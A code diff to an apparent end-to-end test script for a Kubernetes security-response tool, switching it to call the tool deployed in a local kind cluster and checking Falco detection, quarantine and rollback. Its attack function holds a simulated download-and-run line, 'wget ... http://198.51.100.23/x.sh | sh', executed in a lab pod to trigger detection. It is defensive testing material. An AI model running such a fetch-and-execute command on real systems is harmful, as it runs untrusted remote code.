@@ -1,15 +1,15 @@
-"""Scenario S1 against a real Kubernetes cluster: the kind lab, end to end.
+"""Scenario S1 against CloudShield running inside a real Kubernetes cluster: the kind lab, end to end.
 
-    make lab-up && make lab-e2e                  # replays the S1 Falco alert against a live pod
-    python scripts/lab_e2e.py --alert falco      # a real attack, detected by Falco in the cluster
+    make lab-up && make lab-e2e
 
-Unlike scripts/demo.py, nothing on the Kubernetes side is simulated. With `--alert falco` (what CI
-runs) a download-and-run is executed inside a live checkout pod, Falco detects it, and
-Falcosidekick posts the alert to CloudShield's webhook; with the default `--alert fixture` the S1
-Falco alert is re-addressed to the pod instead. Enrichment reads the cluster as the investigator service
-account; the quarantine runs as the responder service account; and a probe pod proves with real
-traffic that the NetworkPolicies cut the quarantined pod off and that rollback restores it. Only AWS
-is missing (kind has no EKS Pod Identity or EC2), so those fields stay unresolved.
+Unlike scripts/demo.py, nothing on the Kubernetes side is simulated. CloudShield runs as a pod,
+installed by its Helm chart, and this script talks to it through a port-forward. With `--alert falco`
+(what CI runs) a download-and-run is executed inside a live checkout pod, Falco detects it, and
+Falcosidekick posts the alert to the CloudShield Service; with the default `--alert fixture` the S1
+Falco alert is re-addressed to the pod instead. CloudShield reads the cluster as the investigator
+service account, quarantines as the responder, and tests traffic as the prober. A probe pod then
+also proves with real traffic that the NetworkPolicies cut the quarantined pod off and that rollback
+restores it. Only AWS is missing (kind has no EKS Pod Identity or EC2), so those fields stay unresolved.
 
 Exits non-zero if any check fails, so CI can run it on every pull request.
 """
@@ -17,15 +17,13 @@ Exits non-zero if any check fails, so CI can run it on every pull request.
 import argparse
 import copy
 import json
-import logging
 import os
 import subprocess
 import sys
-import tempfile
-import threading
 import time
 import uuid
-from collections.abc import Callable
+from collections.abc import Callable, Iterator
+from contextlib import contextmanager
 from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
@@ -34,26 +32,20 @@ ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT / "services"))
 sys.path.insert(0, str(ROOT / "scripts"))
 
-import uvicorn  # noqa: E402
+import httpx  # noqa: E402
 import yaml  # noqa: E402
-from fastapi.testclient import TestClient  # noqa: E402
 from kubernetes import client, config  # noqa: E402
 from kubernetes.client.exceptions import ApiException  # noqa: E402
 
-from core.app import Settings, build_traffic_probe, create_app  # noqa: E402
-from core.auth import AnalystDirectory, Principal  # noqa: E402
 from demo import Transcript, to_svg  # noqa: E402
-from enrichment.context import PodContext, resolve_pod_context  # noqa: E402
-from ingestion.auth import SourceCredential  # noqa: E402
-from responder.executor import KubernetesExecutor  # noqa: E402
-from responder.quarantine import KubernetesPodApi  # noqa: E402
 
 FIXTURE = ROOT / "detections" / "fixtures" / "s1_suspicious_process" / "falco_alert.json"
 LEAKY = (
     ROOT / "infra" / "policies" / "kyverno" / "tests" / "require-quarantine-exclusion" / "leaky-allow.yaml"
 )
 CLUSTER, NS, PROBE = "kind-cloudshield-lab", "shop", "probe"
-IMAGE_NS, POLICY = "cloudshield", "verify-cloudshield-images"
+IMAGE_NS = "cloudshield"
+SERVICE, LOCAL_PORT = "cloudshield-core", 18080
 SIGNED_IMAGE = "ghcr.io/aymen-nasri/cloudshield:main"
 UNSIGNED_IMAGE = "busybox:1.37.0"
 OTHER_SIGNER_IMAGE = "ghcr.io/sigstore/cosign/cosign:v2.4.1"  # keyless-signed, by Sigstore's workflow
@@ -63,13 +55,9 @@ def kubectl(*args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
     return subprocess.run(["kubectl", *args], capture_output=True, text=True, check=check)  # noqa: S603, S607
 
 
-def service_account_token(name: str) -> str:
-    return kubectl("-n", "cloudshield", "create", "token", name, "--duration=1h").stdout.strip()
-
-
 def as_service_account(name: str) -> client.ApiClient:
     """An API client that authenticates as cloudshield/<name>, not as the cluster admin."""
-    token = service_account_token(name)
+    token = kubectl("-n", "cloudshield", "create", "token", name, "--duration=1h").stdout.strip()
     cfg = client.Configuration()
     config.load_kube_config(client_configuration=cfg)
     cfg.cert_file = cfg.key_file = None  # drop the admin client certificate
@@ -116,13 +104,6 @@ def forbidden(call: Callable[[], Any]) -> bool:
     return False
 
 
-class NoAws:
-    """kind has no EKS Pod Identity or EC2: these lookups fail and are left unresolved."""
-
-    def __getattr__(self, name: str) -> Any:
-        raise RuntimeError("no AWS account in the kind lab")
-
-
 def falco_alert_for(pod: Any) -> bytes:
     """The S1 fixture, re-addressed to a live pod, as Falcosidekick would deliver it."""
     alert = json.loads(FIXTURE.read_text(encoding="utf-8"))
@@ -134,14 +115,6 @@ def falco_alert_for(pod: Any) -> bytes:
     alert["output_fields"]["k8s.pod.name"] = pod.metadata.name
     alert["output_fields"]["k8s.pod.uid"] = pod.metadata.uid
     return json.dumps(alert).encode()
-
-
-def serve(app: Any, port: int) -> None:
-    """Run the same app over HTTP in a background thread, for Falcosidekick's webhook."""
-    server = uvicorn.Server(uvicorn.Config(app, host="0.0.0.0", port=port, log_level="warning"))  # noqa: S104
-    threading.Thread(target=server.run, daemon=True).start()
-    while not server.started:
-        time.sleep(0.1)
 
 
 def attack(pod: str) -> None:
@@ -156,7 +129,7 @@ def attack(pod: str) -> None:
             "wget -T 2 -q -O- http://198.51.100.23/x.sh | sh")  # fmt: skip
 
 
-def case_for(api: TestClient, pod_id: str, event_type: str, *, timeout: float) -> dict[str, Any] | None:
+def case_for(api: httpx.Client, pod_id: str, event_type: str, *, timeout: float) -> dict[str, Any] | None:
     """The case holding this kind of event for this pod, waiting for the alert to arrive if needed."""
     deadline = time.monotonic() + timeout
     while True:
@@ -248,7 +221,29 @@ def image_checks(core: Any) -> list[tuple[str, str, bool, str]]:
     return results
 
 
-def run(alert: str, port: int, admission: bool) -> tuple[Transcript, list[str]]:
+@contextmanager
+def deployed_api() -> Iterator[httpx.Client]:
+    """The API as it runs in the cluster, through a port-forward to its Service."""
+    forward = subprocess.Popen(  # noqa: S603
+        ["kubectl", "-n", IMAGE_NS, "port-forward", f"svc/{SERVICE}", f"{LOCAL_PORT}:80"],  # noqa: S607
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    api = httpx.Client(base_url=f"http://127.0.0.1:{LOCAL_PORT}", timeout=30)
+    try:
+        for _ in range(30):
+            try:
+                api.get("/healthz").raise_for_status()
+                break
+            except httpx.HTTPError:
+                time.sleep(1)
+        yield api
+    finally:
+        api.close()
+        forward.terminate()
+
+
+def run(api: httpx.Client, alert: str, admission: bool) -> tuple[Transcript, list[str]]:
     out, failures = Transcript(), []
     config.load_kube_config()
     admin = client.CoreV1Api()
@@ -266,37 +261,14 @@ def run(alert: str, port: int, admission: bool) -> tuple[Transcript, list[str]]:
     def note(text: str) -> None:
         out.say(" " * 12 + text, "dim")
 
-    def resolve(namespace: str, pod: str) -> PodContext:
-        return resolve_pod_context(
-            core=client.CoreV1Api(investigator), apps=client.AppsV1Api(investigator),
-            eks=NoAws(), ec2=NoAws(), cluster=CLUSTER, namespace=namespace, pod_name=pod,
-        )  # fmt: skip
-
-    settings = Settings(
-        cluster=CLUSTER,
-        investigator="offline",
-        credentials={"falco": SourceCredential(token="lab-falco-key")},  # noqa: S106
-        analysts=AnalystDirectory.from_tokens(
-            {
-                "alice-lab": Principal("analyst:alice", frozenset({"analyst"})),
-                "bob-lab": Principal("analyst:bob", frozenset({"incident-responder"})),
-            }
-        ),
-    )
-    # CloudShield's own verifier tests traffic from the probe pod, as the exec-only prober identity,
-    # configured through the same settings a deployment uses (a token mounted in a file).
-    token_file = Path(tempfile.mkdtemp()) / "prober-token"
-    token_file.write_text(service_account_token("cloudshield-prober"), encoding="utf-8")
-    settings.probe_pod, settings.probe_token_file = f"{NS}/{PROBE}", token_file
-    settings.probe_target_selector = "app=checkout"
-    probe = build_traffic_probe(settings)
-    executor = KubernetesExecutor(KubernetesPodApi(responder), identity="cloudshield-responder", probe=probe)
-    api = TestClient(create_app(settings, pod_resolver=resolve, executor=executor))
     alice, bob = {"authorization": "Bearer alice-lab"}, {"authorization": "Bearer bob-lab"}
 
     title = "a live Falco detection" if alert == "falco" else "a replayed Falco alert"
     out.say(f"CloudShield · scenario S1 on a real Kubernetes cluster (kind), from {title}", "title")
-    out.say("real API, cluster, RBAC and NetworkPolicies · no AWS (IAM role and EC2 stay unresolved)", "dim")
+    out.say(
+        "CloudShield runs as a pod · real RBAC and NetworkPolicies · no AWS: IAM and EC2 stay unresolved",
+        "dim",
+    )
     out.say("")
 
     nodes = admin.list_node().items
@@ -307,16 +279,28 @@ def run(alert: str, port: int, admission: bool) -> tuple[Transcript, list[str]]:
     )  # fmt: skip
     target, other = pods[0], pods[1]
     row("1", "cluster", f"{len(nodes)} nodes, Calico, shop app with {len(pods)} checkout pods", "ready")
+    core = admin.list_namespaced_pod(IMAGE_NS, label_selector=f"app.kubernetes.io/name={SERVICE}").items
+    running = [p for p in core if p.status.phase == "Running"]
+    deployed = len(running) == 1 and running[0].spec.service_account_name == "cloudshield-investigator"
+    row(
+        "",
+        "deploy",
+        "CloudShield pod, from its Helm chart",
+        "running" if deployed else "NOT RUNNING",
+        deployed,
+    )
+    if running:
+        restarts = sum(c.restart_count for c in running[0].status.container_statuses or [])
+        note(f"{running[0].metadata.name} as {running[0].spec.service_account_name}, {restarts} restarts")
     note(f"target {target.metadata.name} ({target.status.pod_ip}) on {target.spec.node_name}")
     before = reachable(target.status.pod_ip) and reachable(other.status.pod_ip)
     row("", "traffic", "probe -> both checkout pods on 8080", "reachable" if before else "BLOCKED", before)
 
     pod_id = f"k8s:pod/{NS}/{target.metadata.name}"
     if alert == "falco":
-        serve(api.app, port)  # Falcosidekick posts here from inside the cluster
         attack(target.metadata.name)
         row("2", "attack", "wget ... | sh in a debug container of the pod", "launched")
-        note("Falco (modern eBPF) -> Falcosidekick -> CloudShield webhook, token-authenticated")
+        note("Falco (modern eBPF) -> Falcosidekick -> CloudShield Service, token-authenticated")
     else:
         r = api.post("/v1/ingest/falco", content=falco_alert_for(target),
                      headers={"authorization": "Bearer lab-falco-key"})  # fmt: skip
@@ -431,15 +415,14 @@ def main() -> int:
         default="fixture",
         help="replay the S1 alert, or attack the pod and wait for Falco's real alert",
     )
-    parser.add_argument("--port", type=int, default=8099, help="webhook port for Falcosidekick (falco mode)")
     parser.add_argument(
         "--admission",
         action="store_true",
-        help="also check that Kyverno rejects a leaky allow-policy (needs Kyverno installed)",
+        help="also check Kyverno's admission decisions (needs Kyverno installed)",
     )
     args = parser.parse_args()
-    logging.getLogger("enrichment.context").setLevel(logging.ERROR)  # the expected "no AWS" warnings
-    transcript, failures = run(args.alert, args.port, args.admission)
+    with deployed_api() as api:
+        transcript, failures = run(api, args.alert, args.admission)
     text = "\n".join(t for _, t in transcript.lines)
     if summary := os.getenv("GITHUB_STEP_SUMMARY"):
         with open(summary, "a", encoding="utf-8") as f:
